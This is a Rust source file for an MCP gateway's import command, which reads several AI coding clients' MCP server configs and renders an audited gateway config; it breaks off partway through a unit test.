// SPDX-License-Identifier: Apache-2.0
//! `mcpdef import`, and `mcpdef up` with no config: the MCP servers this
//! machine's clients already run, read from the clients' own config files, and
//! the gateway config that fronts them.
//!
//! It reads the files `mcpdef connect` writes ([`crate::clients`]), and a few
//! more each client keeps. It changes none of them:
//!
//! | Client | Files | Servers under |
//! |---|---|---|
//! | Claude Code | `.mcp.json`; `~/.claude.json` | `mcpServers`; in `~/.claude.json`, also under `projects.<this directory>` |
//! | Claude Desktop | its `claude_desktop_config.json` | `mcpServers` |
//! | Cursor | `.cursor/mcp.json`; `~/.cursor/mcp.json` | `mcpServers` |
//! | VS Code | `.vscode/mcp.json` | `servers` |
//! | Codex | `~/.codex/config.toml` | `[mcp_servers.<name>]` |
//!
//! The config it writes takes nothing away that a client could do before: each
//! server's tools, resources and prompts are all let through. What it adds is
//! the record, every call in the audit ledger, and inspection that warns
//! without blocking. It is a starting point to tighten.
//!
//! A file in the working directory can be anyone's, a repository just cloned,
//! and no client runs the servers it names unasked. So a server only such a
//! file names is fronted when a client was told to run it there (see
//! [`Projects`]), or when [`Projects::All`] asks for all of them.

use crate::clients::Client;
use anyhow::{Context, Result};
use mcpdef_secrets::{SecretRef, SecretString};
use serde_json::{Map, Value};
use std::net::IpAddr;
use std::path::{Path, PathBuf};
use toml_edit::{value, Array, ArrayOfTables, DocumentMut, InlineTable, Item, Table};

/// Where a server was found.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Source {
    pub client: Client,
    pub file: PathBuf,
    /// The file as a person would write it: `./.mcp.json`, `~/.cursor/mcp.json`.
    pub shown: String,
    /// Whether the file is the working directory's own, not the user's.
    pub project: bool,
}

impl Source {
    pub fn describe(&self) -> String {
        format!("{} ({})", self.client.title(), self.shown)
    }
}

/// `file` from the working directory or the home directory, if it is under one.
fn shown(file: &Path, home: Option<&Path>, cwd: &Path) -> String {
    if let Ok(rel) = file.strip_prefix(cwd) {
        return format!("./{}", rel.display());
    }
    if let Some(rel) = home.and_then(|h| file.strip_prefix(h).ok()) {
        return format!("~/{}", rel.display());
    }
    file.display().to_string()
}

/// A value a client gives a server: as it is written, or one of the client's
/// own environment variables, which MCPdef then reads from its own.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Secret {
    Written(String),
    Env(String),
}

/// The header a client sends to an HTTP server.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Auth {
    Bearer(Secret),
    Header { name: String, value: Secret },
}

/// How a client reaches a server.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Server {
    Stdio {
        command: Vec<String>,
        env: Vec<(String, Secret)>,
    },
    Http {
        url: String,
        sse: bool,
        auth: Option<Auth>,
    },
}

/// A server some client runs, and every client found running it.
#[derive(Debug, Clone)]
pub struct Found {
    /// Its `[[server]] id`: the name the client gives it, unless another
    /// client gives that name to a different server.
    pub name: String,
    pub server: Server,
    pub sources: Vec<Source>,
    /// What could not be carried over as the client had it.
    pub notes: Vec<String>,
}

/// An entry that is not fronted, and why.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Skipped {
    pub name: String,
    pub source: Source,
    pub why: String,
}

/// A file that would not read.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Unread {
    pub source: Source,
    pub why: String,
}

/// What a search of the clients' files found.
#[derive(Debug, Default)]
pub struct Discovered {
    pub found: Vec<Found>,
    pub skipped: Vec<Skipped>,
    pub unread: Vec<Unread>,
}

/// Which of the servers that only the working directory's own files name are
/// fronted.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Projects {
    /// Those a client was told to run there: in Claude Code, the `.mcp.json`
    /// servers approved for the directory, as `~/.claude.json` or the user's
    /// own `~/.claude/settings.json` records it. MCPdef cannot see that Cursor
    /// or VS Code was told to run one, so theirs are not fronted.
    Approved,
    /// All of them: `mcpdef import --project-servers`.
    All,
}

/// One entry of a client's file, as [`merge`] takes it.
struct Entry {
    source: Source,
    name: String,
    server: Server,
    notes: Vec<String>,
    /// Whether a client runs it unasked: it is in the user's own file, or
    /// approved for this directory.
    approved: bool,
}

/// Where each client keeps its servers, under which keys (a path of keys from
/// the file's root), and whether the file is the working directory's own.
fn files(home: Option<&Path>, cwd: &Path) -> Vec<(Client, PathBuf, Vec<Vec<String>>, bool)> {
    let keys = |k: &[&str]| k.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    let mut files = vec![
        (
            Client::ClaudeCode,
            cwd.join(".mcp.json"),
            vec![keys(&["mcpServers"])],
            true,
        ),
        (
            Client::Cursor,
            cwd.join(".cursor").join("mcp.json"),
            vec![keys(&["mcpServers"])],
            true,
        ),
        (
            Client::VsCode,
            cwd.join(".vscode").join("mcp.json"),
            vec![keys(&["servers"])],
            true,
        ),
    ];
    if let Some(home) = home {
        // The servers `~/.claude.json` keeps for this directory are the user's
        // own (`claude mcp add`), as its others are.
        files.push((
            Client::ClaudeCode,
            home.join(".claude.json"),
            vec![
                keys(&["mcpServers"]),
                vec![
                    "projects".to_string(),
                    cwd.to_string_lossy().into_owned(),
                    "mcpServers".to_string(),
                ],
            ],
            false,
        ));
        files.push((
            Client::Cursor,
            home.join(".cursor").join("mcp.json"),
            vec![keys(&["mcpServers"])],
            false,
        ));
        files.push((
            Client::Codex,
            home.join(".codex").join("config.toml"),
            vec![keys(&["mcp_servers"])],
            false,
        ));
    }
    if let Some(desktop) = crate::clients::default_file(Client::ClaudeDesktop, home) {
        files.push((
            Client::ClaudeDesktop,
            desktop,
            vec![keys(&["mcpServers"])],
            false,
        ));
    }
    files
}

/// The `.mcp.json` servers Claude Code was told to run in `cwd`, as it records
/// that in `~/.claude.json` for the directory, or as the user's own
/// `~/.claude/settings.json` says. Never as a file in the directory says: the
/// directory's author wrote that.
#[derive(Debug, Default)]
struct Approvals {
    all: bool,
    enabled: Vec<String>,
    disabled: Vec<String>,
}

impl Approvals {
    fn read(home: Option<&Path>, cwd: &Path) -> Approvals {
        let mut approvals = Approvals::default();
        let Some(home) = home else {
            return approvals;
        };
        let mut take = |doc: &Value| {
            if doc.get("enableAllProjectMcpServers") == Some(&Value::Bool(true)) {
                approvals.all = true;
            }
            for (key, names) in [
                ("enabledMcpjsonServers", &mut approvals.enabled),
                ("disabledMcpjsonServers", &mut approvals.disabled),
            ] {
                let listed = doc.get(key).and_then(Value::as_array).into_iter().flatten();
                names.extend(listed.filter_map(Value::as_str).map(str::to_string));
            }
        };
        if let Ok(Some(doc)) = read_doc(&home.join(".claude.json")) {
            let project = doc
                .get("projects")
                .and_then(|p| p.get(cwd.to_string_lossy().as_ref()));
            if let Some(project) = project {
                take(project);
            }
        }
        if let Ok(Some(doc)) = read_doc(&home.join(".claude").join("settings.json")) {
            take(&doc);
        }
        approvals
    }

    fn approve(&self, name: &str) -> bool {
        let listed = |names: &[String]| names.iter().any(|n| n == name);
        !listed(&self.disabled) && (self.all || listed(&self.enabled))
    }
}

/// Why a server only the working directory's own files name is not fronted.
fn unapproved(source: &Source) -> String {
    let told = match source.client {
        Client::ClaudeCode => format!("{} was not told to run it here", source.client.title()),
        client => format!(
            "MCPdef cannot see whether {} was told to run it here",
            client.title()
        ),
    };
    format!(
        "only this directory's {} names it, and {told}: read what it runs, then give \
         `mcpdef import --project-servers`",
        source.shown
    )
}

/// Every server the clients' files in `home` and `cwd` name, read only from
/// `clients` when it is not empty, the working directory's own as `projects`
/// says. `listen` is the gateway's own address: a client entry that reaches it
/// is MCPdef already, and is not fronted again.
pub fn discover(
    home: Option<&Path>,
    cwd: &Path,
    clients: &[Client],
    listen: &str,
    projects: Projects,
) -> Discovered {
    let mut entries: Vec<Entry> = Vec::new();
    let mut out = Discovered::default();
    let approvals = Approvals::read(home, cwd);
    for (client, file, roots, project) in files(home, cwd) {
        if !clients.is_empty() && !clients.contains(&client) {
            continue;
        }
        let source = Source {
            client,
            shown: shown(&file, home, cwd),
            file: file.clone(),
            project,
        };
        let doc = match read_doc(&file) {
            Ok(Some(doc)) => doc,
            Ok(None) => continue,
            Err(e) => {
                out.unread.push(Unread {
                    source,
                    why: format!("{e:#}"),
                });
                continue;
            }
        };
        for root in roots {
            let Some(servers) = at(&doc, &root).and_then(Value::as_object) else {
                continue;
            };
            for (name, entry) in servers {
                match parse_entry(client, entry, listen) {
                    Ok((server, notes)) => entries.push(Entry {
                        approved: !project
                            || (client == Client::ClaudeCode && approvals.approve(name)),
                        source: source.clone(),
                        name: name.clone(),
                        server,
                        notes,
                    }),
                    Err(why) => out.skipped.push(Skipped {
                        name: name.clone(),
                        source: source.clone(),
                        why,
                    }),
                }
            }
        }
    }
    // A server some client runs unasked is fronted, however many other files
    // name it too. One only the directory's own files name is fronted when
    // `projects` says, and said to be when it is.
    let approved: Vec<Server> = entries
        .iter()
        .filter(|e| e.approved)
        .map(|e| e.server.clone())
        .collect();
    let mut kept = Vec::new();
    for mut entry in entries {
        if entry.approved || approved.contains(&entry.server) {
            kept.push(entry);
        } else if projects == Projects::All {
            entry.notes.push(format!(
                "only this directory's {} names it, and no client was told to run it here: \
                 read what it runs before `mcpdef up` starts it",
                entry.source.shown
            ));
            kept.push(entry);
        } else {
            out.skipped.push(Skipped {
                why: unapproved(&entry.source),
                name: entry.name,
                source: entry.source,
            });
        }
    }
    // The user's own entries first: the name a server is fronted under is the
    // one the user gave it, where there is one.
    kept.sort_by_key(|e| !e.approved);
    out.found = merge(kept);
    out
}

/// The servers `client`'s files other than `except` name that `cfg` fronts,
/// by name, with the file they are in: after `--replace` takes them out of
/// `except`, the client still reaches these directly as well.
pub fn fronted_elsewhere(
    client: Client,
    home: Option<&Path>,
    cwd: &Path,
    except: &Path,
    cfg: &crate::config::Config,
) -> Vec<(String, String)> {
    let mut out = Vec::new();
    for (c, file, roots, _) in files(home, cwd) {
        if c != client || file == except {
            continue;
        }
        let Ok(Some(doc)) = read_doc(&file) else {
            continue;
        };
        for root in roots {
            let servers = at(&doc, &root).and_then(Value::as_object);
            for (name, entry) in servers.into_iter().flatten() {
                if let Ok((server, _)) = parse_entry(client, entry, &cfg.gateway.listen) {
                    if fronts(cfg, &server) {
                        out.push((name.clone(), shown(&file, home, cwd)));
                    }
                }
            }
        }
    }
    out
}

/// The servers `file` holds under `root` (`mcpServers`, `servers`, or Codex's
/// `mcp_servers`), by name, read as [`discover`] reads them. An entry that
/// would not be fronted, MCPdef's own among them, is left out.
pub fn servers_in(
    client: Client,
    file: &Path,
    root: &str,
    listen: &str,
) -> Result<Vec<(String, Server)>> {
    let Some(doc) = read_doc(file)? else {
        return Ok(Vec::new());
    };
    let servers = doc.get(root).and_then(Value::as_object);
    Ok(servers
        .into_iter()
        .flatten()
        .filter_map(|(name, entry)| {
            parse_entry(client, entry, listen)
                .ok()
                .map(|(server, _)| (name.clone(), server))
        })
        .collect())
}

/// Whether `cfg` fronts `server` as the client runs it: it has a `[[server]]`
/// that runs the same command line, with each variable the client sets it set
/// the same way; or that reaches the same URL with the same credentials. The
/// same command or URL with another token is another server: a client's
/// read-only GitHub and its admin one, say.
pub fn fronts(cfg: &crate::config::Config, server: &Server) -> bool {
    cfg.servers.iter().any(|s| match server {
        Server::Stdio { command, env } => {
            s.transport == "stdio"
                && &s.command == command
                && env
                    .iter()
                    .all(|(name, theirs)| s.env.get(name) == Some(&secret_ref(theirs)))
        }
        Server::Http { url, auth, .. } => {
            s.url.as_deref() == Some(url.as_str()) && same_auth(auth.as_ref(), s.auth.as_ref())
        }
    })
}

/// A client's value as the config would hold it.
fn secret_ref(secret: &Secret) -> SecretRef {
    match secret {
        Secret::Written(v) => SecretRef::Literal(SecretString::from(v.clone())),
        Secret::Env(name) => SecretRef::Env(name.clone()),
    }
}

/// Whether the gateway sends an upstream the header the client sends it.
fn same_auth(theirs: Option<&Auth>, ours: Option<&crate::config::ServerAuth>) -> bool {
    use crate::config::ServerAuthKind;
    match (theirs, ours) {
        (None, None) => true,
        (Some(Auth::Bearer(token)), Some(a)) => {
            a.kind == ServerAuthKind::Bearer && a.token == Some(secret_ref(token))
        }
        (Some(Auth::Header { name, value }), Some(a)) => {
            a.kind == ServerAuthKind::Header
                && a.name
                    .as_deref()
                    .is_some_and(|n| n.eq_ignore_ascii_case(name))
                && a.value == Some(secret_ref(value))
        }
        _ => false,
    }
}

/// The file as a JSON value, a TOML one converted; `None` when there is no
/// such file.
fn read_doc(file: &Path) -> Result<Option<Value>> {
    let text = match std::fs::read_to_string(file) {
        Ok(text) => text,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e).with_context(|| format!("reading {}", file.display())),
    };
    let doc = if file.extension().is_some_and(|e| e == "toml") {
        let table: toml::Table =
            toml::from_str(&text).with_context(|| format!("parsing {}", file.display()))?;
        serde_json::to_value(table)?
    } else {
        serde_json::from_str(&text).with_context(|| format!("parsing {}", file.display()))?
    };
    Ok(Some(doc))
}

fn at<'a>(doc: &'a Value, path: &[String]) -> Option<&'a Value> {
    path.iter().try_fold(doc, |v, k| v.get(k))
}

/// One client entry, or why it is not fronted.
fn parse_entry(
    client: Client,
    entry: &Value,
    listen: &str,
) -> Result<(Server, Vec<String>), String> {
    let Some(obj) = entry.as_object() else {
        return Err("it is not a table".into());
    };
    if obj.get("disabled") == Some(&Value::Bool(true))
        || obj.get("enabled") == Some(&Value::Bool(false))
    {
        return Err("the client has it turned off".into());
    }
    let mut notes = Vec::new();
    let text = |key: &str| obj.get(key).and_then(Value::as_str);
    let url = text("url").or_else(|| text("serverUrl"));
    if let Some(url) = url {
        if reaches(url, listen) {
            return Err(format!("it is MCPdef itself, at {url}"));
        }
        if url.contains("${") {
            notes.push(format!(
                "its URL, {url}, names a variable the client fills in; MCPdef takes it as written"
            ));
        }
        let sse = text("type") == Some("sse") || text("transport") == Some("sse");
        let auth = match client {
            Client::Codex => codex_auth(obj, &mut notes),
            _ => headers(client, obj, &mut notes),
        };
        return Ok((
            Server::Http {
                url: url.to_string(),
                sse,
                auth,
            },
            notes,
        ));
    }
    let Some(program) = text("command") else {
        return Err("it has neither a command to run nor a URL".into());
    };
    let mut command = vec![program.to_string()];
    for arg in obj
        .get("args")
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
    {
        match arg.as_str() {
            Some(a) => command.push(a.to_string()),
            None => command.push(arg.to_string()),
        }
    }
    if runs_mcpdef(&command) {
        return Err("it is MCPdef itself".into());
    }
    if command.iter().any(|part| part.contains("${")) {
        notes.push(
            "its command names a variable the client fills in; MCPdef runs it as written".into(),
        );
    }
    let mut env = Vec::new();
    for (name, v) in obj
        .get("env")
        .and_then(Value::as_object)
        .into_iter()
        .flatten()
    {
        let raw = match v.as_str() {
            Some(s) => s.to_string(),
            None => v.to_string(),
        };
        env.push((name.clone(), secret(client, name, &raw, &mut notes)));
    }
    if let Some(dir) = text("cwd") {
        notes.push(format!(
            "the client runs it in {dir}; MCPdef runs it in its own working directory"
        ));
    }
    if let Some(file) = text("envFile") {
        notes.push(format!(
            "the client reads variables for it from {file}; give them to MCPdef in [server.env]"
        ));
    }
    Ok((Server::Stdio { command, env }, notes))
}

/// The header an HTTP entry sends, as `[server.auth]` can send one.
fn headers(client: Client, obj: &Map<String, Value>, notes: &mut Vec<String>) -> Option<Auth> {
    let mut auth = None;
    for (name, v) in obj
        .get("headers")
        .and_then(Value::as_object)
        .into_iter()
        .flatten()
    {
        let Some(raw) = v.as_str() else { continue };
        if auth.is_some() {
            notes.push(format!(
                "the client also sends a {name} header; MCPdef sends one header to an upstream"
            ));
            continue;
        }
        auth = Some(match raw.strip_prefix("Bearer ") {
            Some(token) if name.eq_ignore_ascii_case("authorization") => {
                Auth::Bearer(secret(client, name, token, notes))
            }
            _ => Auth::Header {
                name: name.clone(),
                value: secret(client, name, raw, notes),
            },
        });
    }
    auth
}

/// The header a Codex entry sends: `bearer_token_env_var`, `http_headers` (a
/// value as written) or `env_http_headers` (a value from a variable).
fn codex_auth(obj: &Map<String, Value>, notes: &mut Vec<String>) -> Option<Auth> {
    let mut found = Vec::new();
    if let Some(var) = obj.get("bearer_token_env_var").and_then(Value::as_str) {
        found.push((
            "Authorization".to_string(),
            Auth::Bearer(Secret::Env(var.into())),
        ));
    }
    let tables = [
        ("http_headers", Secret::Written as fn(String) -> Secret),
        ("env_http_headers", Secret::Env as fn(String) -> Secret),
    ];
    for (key, secret) in tables {
        let headers = obj
            .get(key)
            .and_then(Value::as_object)
            .into_iter()
            .flatten();
        for (name, v) in headers {
            if let Some(v) = v.as_str() {
                let value = secret(v.to_string());
                found.push((
                    name.clone(),
                    Auth::Header {
                        name: name.clone(),
                        value,
                    },
                ));
            }
        }
    }
    let mut found = found.into_iter();
    let auth = found.next().map(|(_, auth)| auth);
    for (name, _) in found {
        notes.push(format!(
            "the client also sends a {name} header; MCPdef sends one header to an upstream"
        ));
    }
    auth
}

/// A value as the client writes it: a variable of its own environment when the
/// client reads one there, the string itself otherwise.
fn secret(client: Client, name: &str, raw: &str, notes: &mut Vec<String>) -> Secret {
    let Some(inner) = raw
        .strip_prefix("${")
        .and_then(|r| r.strip_suffix('}'))
        .filter(|inner| !inner.contains("${") && !inner.contains('}'))
    else {
        if raw.contains("${") {
            notes.push(format!(
                "{name} is made from variables the client fills in; MCPdef takes it as written"
            ));
        }
        return Secret::Written(raw.to_string());
    };
    let var = |v: &str| {
        let mut chars = v.chars();
        chars
            .next()
            .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
            && chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
    };
    if let Some(v) = inner.strip_prefix("env:").filter(|v| var(v)) {
        if matches!(client, Client::Cursor | Client::VsCode) {
            return Secret::Env(v.to_string());
        }
    }
    if let Some(id) = inner.strip_prefix("input:") {
        notes.push(format!(
            "the client asks for {name} (input {id}) when it starts the server; MCPdef cannot ask: \
             write the value in, or {{ env = \"…\" }} for a variable MCPdef has"
        ));
        return Secret::Written(raw.to_string());
    }
    if client == Client::ClaudeCode {
        let (v, default) = match inner.split_once(":-") {
            Some((v, d)) => (v, Some(d)),
            None => (inner, None),
        };
        if var(v) {
            if let Some(d) = default {
                notes.push(format!(
                    "{name} falls back to {d:?} in the client when {v} is unset; MCPdef has no fallback"
                ));
            }
            return Secret::Env(v.to_string());
        }
    }
    notes.push(format!(
        "{name} names a variable MCPdef does not read the way the client does; it is taken as written"
    ));
    Secret::Written(raw.to_string())
}

/// Whether `url` is the gateway's own listener, at `listen` (`host:port`): the
/// listener's port, at
/// - the listener's own host, as written;
/// - a loopback address (`127.0.0.0/8`, `[::1]`, `localhost`) or the unspecified one
///   (`0.0.0.0`, `[::]`), for a listener on loopback or on every address;
/// - this machine's name, or an address one of its interfaces holds, such as its LAN
///   address, for a listener on every address, which takes a connection to any of them.
///
/// An address is taken for this machine's own when a socket can be bound to it, which
/// looks nothing up and sends nothing. A name that reaches this machine only through DNS,
/// such as a fully qualified one, is not recognized; written as its address, it is.
fn reaches(url: &str, listen: &str) -> bool {
    let Ok(url) = url::Url::parse(url) else {
        return false;
    };
    let (Some(host), Some(port)) = (url.host(), url.port_or_known_default()) else {
        return false;
    };
    let Some((listener, listen_port)) = split_listen(listen) else {
        return false;
    };
    if port != listen_port {
        return false;
    }
    let target = Where::of(host);
    if target == listener {
        return true;
    }
    if listener.is_unspecified() {
        return target.is_loopback() || target.is_unspecified() || target.is_this_machine();
    }
    listener.is_loopback() && (target.is_loopback() || target.is_unspecified())
}

/// The listener's host and port, from `host:port`, `[v6]:port` or `:port` (every
/// address).
fn split_listen(listen: &str) -> Option<(Where, u16)> {
    let (host, port) = listen.trim().rsplit_once(':')?;
    let port = port.parse().ok()?;
    let host = host.trim_start_matches('[').trim_end_matches(']');
    let host = match host {
        "" => Where::Ip(IpAddr::from([0, 0, 0, 0])),
        host => Where::named(host),
    };
    Some((host, port))
}

/// A host, as a URL or a listen address names it.
#[derive(Debug, PartialEq, Eq)]
enum Where {
    /// An IPv4-mapped IPv6 address held as the IPv4 one.
    Ip(IpAddr),
    /// Lowercased, without a trailing dot.
    Name(String),
}

impl Where {
    fn ip(ip: IpAddr) -> Where {
        match ip {
            IpAddr::V6(v6) => Where::Ip(v6.to_ipv4_mapped().map_or(ip, IpAddr::V4)),
            ip => Where::Ip(ip),
        }
    }

    fn named(host: &str) -> Where {
        match host.parse::<IpAddr>() {
            Ok(ip) => Where::ip(ip),
            Err(_) => Where::Name(host.trim_end_matches('.').to_ascii_lowercase()),
        }
    }

    fn of(host: url::Host<&str>) -> Where {
        match host {
            url::Host::Domain(name) => Where::named(name),
            url::Host::Ipv4(ip) => Where::ip(IpAddr::V4(ip)),
            url::Host::Ipv6(ip) => Where::ip(IpAddr::V6(ip)),
        }
    }

    fn is_loopback(&self) -> bool {
        match self {
            Where::Ip(ip) => ip.is_loopback(),
            Where::Name(name) => name == "localhost" || name.ends_with(".localhost"),
        }
    }

    fn is_unspecified(&self) -> bool {
        matches!(self, Where::Ip(ip) if ip.is_unspecified())
    }

    /// This machine's own: an address one of its interfaces holds, which a socket can be
    /// bound to, or its name.
    fn is_this_machine(&self) -> bool {
        match self {
            Where::Ip(ip) => std::net::UdpSocket::bind((*ip, 0)).is_ok(),
            Where::Name(name) => this_hostname().is_some_and(|host| {
                let short = host.strip_suffix(".local").unwrap_or(&host);
                name == &host || name == short || *name == format!("{short}.local")
            }),
        }
    }
}

/// This machine's name, lowercased: from the kernel or the environment where they say,
/// else from `hostname`.
fn this_hostname() -> Option<String> {
    let read = |path: &str| std::fs::read_to_string(path).ok();
    let var = |name: &str| std::env::var(name).ok();
    let name = read("/proc/sys/kernel/hostname")
        .or_else(|| var("COMPUTERNAME"))
        .or_else(|| var("HOSTNAME"))
        .or_else(|| read("/etc/hostname"))
        .or_else(|| {
            let out = std::process::Command::new("hostname").output().ok()?;
            out.status
                .success()
                .then(|| String::from_utf8_lossy(&out.stdout).into_owned())
        })?;
    let name = name.trim().trim_end_matches('.').to_ascii_lowercase();
    (!name.is_empty()).then_some(name)
}

/// Whether `command` runs MCPdef: its binary (`mcpdef`, `mcpdef.exe`), or its image under
/// `docker run` or `podman run`, the one launcher it ships for. Not `npx` or `uvx`: there
/// is no package of it for them to fetch.
fn runs_mcpdef(command: &[String]) -> bool {
    let Some((program, args)) = command.split_first() else {
        return false;
    };
    match Path::new(program).file_stem().and_then(|s| s.to_str()) {
        Some("mcpdef") => true,
        Some("docker" | "podman") => run_image(args).is_some_and(is_mcpdef_image),
        _ => false,
    }
}

/// The image a `run` (or `container run`) command line names: its first argument that is
/// neither an option nor an option's value.
fn run_image(args: &[String]) -> Option<&str> {
    // The short options of `docker run` that take a value; every other one is a flag.
    const VALUED_SHORT: &str = "acehlmpuvw";
    // The long options that take none; every other one does, unless written `--opt=value`.
    const FLAGS: &[&str] = &[
        "rm",
        "init",
        "interactive",
        "tty",
        "detach",
        "privileged",
        "read-only",
        "publish-all",
        "no-healthcheck",
        "oom-kill-disable",
        "sig-proxy",
        "disable-content-trust",
        "quiet",
        "help",
    ];
    let mut args = args.iter().map(String::as_str);
    match args.next()? {
        "run" => {}
        "container" if args.next()? == "run" => {}
        _ => return None,
    }
    while let Some(arg) = args.next() {
        if arg == "--" {
            return args.next();
        }
        if let Some(long) = arg.strip_prefix("--") {
            if !long.contains('=') && !FLAGS.contains(&long) {
                args.next();
            }
        } else if let Some(short) = arg.strip_prefix('-').filter(|s| !s.is_empty()) {
            // A cluster of flags (`-it`), or one that takes a value: the rest of the
            // argument (`-eKEY=1`), or the next one when it is last (`-it -e KEY=1`).
            if let Some(at) = short.find(|c| VALUED_SHORT.contains(c)) {
                if at + 1 == short.len() {
                    args.next();
                }
            }
        } else {
            return Some(arg);
        }
    }
    None
}

/// Whether `image` (`[registry/][path/]name[:tag][@digest]`) is named `mcpdef`, as
/// `mancube/mcpdef:latest` is.
fn is_mcpdef_image(image: &str) -> bool {
    let image = image.split('@').next().unwrap_or(image);
    let name = image.rsplit('/').next().unwrap_or(image);
    name.split(':').next() == Some("mcpdef")
}

/// One `Found` per server: a server found again, under any name, is fronted
/// once, and a different server under a name already taken gets the client's
/// name after it.
fn merge(entries: Vec<Entry>) -> Vec<Found> {
    let mut found: Vec<Found> = Vec::new();
    for Entry {
        source,
        name,
        server,
        notes,
        ..
    } in entries
    {
        if let Some(same) = found.iter_mut().find(|f| f.server == server) {
            if same.name != name {
                same.notes
                    .push(format!("{} calls it {name}", source.describe()));
            }
            same.sources.push(source);
            continue;
        }
        let mut id = name.clone();
        let mut notes = notes;
        if found.iter().any(|f| f.name == id) {
            let base = format!("{name}-{}", source.client.name());
            id = base.clone();
            let mut n = 2;
            while found.iter().any(|f| f.name == id) {
                id = format!("{base}-{n}");
                n += 1;
            }
            notes.push(format!(
                "named {id}: another client's {name} is a different server"
            ));
        }
        found.push(Found {
            name: id,
            server,
            sources: vec![source],
            notes,
        });
    }
    found
}

/// `text` for a line of a comment, or of a message: each control character, a
/// line break above all, written as its escape, so that nothing a client's file
/// holds ends the comment and starts TOML of its own.
pub fn one_line(text: &str) -> String {
    text.chars()
        .map(|c| match c.is_control() {
            true => c.escape_default().to_string(),
            false => c.to_string(),
        })
        .collect()
}

/// The gateway config that fronts `found`, listening on `listen`.
pub fn render(discovered: &Discovered, listen: &str) -> String {
    let mut doc = DocumentMut::new();
    let mut gateway = Table::new();
    gateway["listen"] = value(listen);
    gateway["audit"] = value("./mcpdef-audit/audit.log");
    let mut inspect = Table::new();
    inspect["mode"] = value("warn");
    gateway["inspect"] = Item::Table(inspect);
    doc["gateway"] = Item::Table(gateway);

    let mut servers = ArrayOfTables::new();
    for f in &discovered.found {
        let mut t = Table::new();
        let mut comment = String::from("\n");
        for s in &f.sources {
            comment.push_str(&format!("# From {}.\n", one_line(&s.describe())));
        }
        for n in &f.notes {
            comment.push_str(&format!("# Note: {}.\n", one_line(n)));
        }
        t.decor_mut().set_prefix(comment);
        t["id"] = value(&f.name);
        match &f.server {
            Server::Stdio { command, env } => {
                t["transport"] = value("stdio");
                t["command"] = value(command.iter().map(String::as_str).collect::<Array>());
                put_lists(&mut t);
                if !env.is_empty() {
                    let mut e = Table::new();
                    for (name, s) in env {
                        e[name.as_str()] = secret_item(s);
                    }
                    t["env"] = Item::Table(e);
                }
            }
            Server::Http { url, sse, auth } => {
                t["transport"] = value(if *sse { "sse" } else { "streamable-http" });
                t["url"] = value(url.as_str());
                put_lists(&mut t);
                if let Some(auth) = auth {
                    let mut a = Table::new();
                    match auth {
                        Auth::Bearer(token) => {
                            a["kind"] = value("bearer");
                            a["token"] = secret_item(token);
                        }
                        Auth::Header { name, value: v } => {
                            a["kind"] = value("header");
                            a["name"] = value(name.as_str());
                            a["value"] = secret_item(v);
                        }
                    }
                    t["auth"] = Item::Table(a);
                }
            }
        }
        servers.push(t);
    }
    doc["server"] = Item::ArrayOfTables(servers);

    let mut out = String::from(HEADER);
    out.push_str(&doc.to_string());
    if !discovered.skipped.is_empty() {
        out.push_str("\n# Not fronted:\n");
        for s in &discovered.skipped {
            out.push_str(&format!(
                "# - {}, from {}: {}.\n",
                one_line(&s.name),
                one_line(&s.source.describe()),
                one_line(&s.why)
            ));
        }
    }
    out
}

const HEADER: &str = "\
# Written by `mcpdef import` from the MCP servers your clients run. It takes away
# nothing they could do: every tool, resource and prompt each server offers is let
# through. What it adds is the record: every call goes in the audit ledger, and
# inspection warns about what it finds without blocking it. Tighten it from here:
# `tools` and `deny` per server, `[[policy]]` rules, `[gateway.inspect] mode`. Every
# key is in docs/CONFIG.md.
";

/// Every resource, resource template and prompt: the server's own choice, as
/// it was before MCPdef fronted it.
fn put_lists(t: &mut Table) {
    t["resources"] = value(["**"].into_iter().collect::<Array>());
    t["resource_templates"] = value(["*"].into_iter().collect::<Array>());
    t["prompts"] = value(["*"].into_iter().collect::<Array>());
}

fn secret_item(s: &Secret) -> Item {
    match s {
        Secret::Written(v) => value(v.as_str()),
        Secret::Env(name) => {
            let mut t = InlineTable::new();
            t.insert("env", name.as_str().into());
            value(t)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const LISTEN: &str = "127.0.0.1:7878";

    fn write(path: &Path, text: &str) {
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(path, text).unwrap();
    }

    #[test]
    fn each_clients_files_are_read() {
        let home = tempfile::tempdir().unwrap();
        let cwd = tempfile::tempdir().unwrap();
        let (h, c) = (home.path(), cwd.path());
        write(
            &c.join(".mcp.json"),
            r#"{"mcpServers":{"fs":{"command":"npx","args":["-y","@modelcontextprotocol/server-filesystem","/srv"]}}}"#,
        );
        write(
            &h.join(".claude.json"),
            &format!(
                r#"{{"mcpServers":{{"user-one":{{"command":"user-srv"}}}},
                    "projects":{{"{}":{{"mcpServers":{{"local-one":{{"type":"http","url":"https://mcp.example.com/mcp"}}}}}},
                                 "/elsewhere":{{"mcpServers":{{"not-here":{{"command":"x"}}}}}}}}}}"#,
                c.display()
            ),
        );
        write(
            &h.join(".cursor/mcp.json"),
            r#"{"mcpServers":{"linear":{"url":"https://mcp.linear.app/sse"}}}"#,
        );
        write(
            &c.join(".vscode/mcp.json"),
            r#"{"servers":{"gh":{"type":"stdio","command":"gh-mcp","args":["serve"]}},"inputs":[]}"#,
        );
        write(
            &h.join(".codex/config.toml"),
            "[mcp_servers.docs]\ncommand = \"docs-mcp\"\nargs = [\"--stdio\"]\n",
        );
        let d = discover(Some(h), c, &[], LISTEN, Projects::All);
        let mut names: Vec<_> = d.found.iter().map(|f| f.name.as_str()).collect();
        names.sort_unstable();
        assert_eq!(
            names,
            ["docs", "fs", "gh", "linear", "local-one", "user-one"]
        );
        assert!(d.unread.is_empty() && d.skipped.is_empty(), "{d:?}");
        let fs = d.found.iter().find(|f| f.name == "fs").unwrap();
        assert_eq!(
            fs.server,
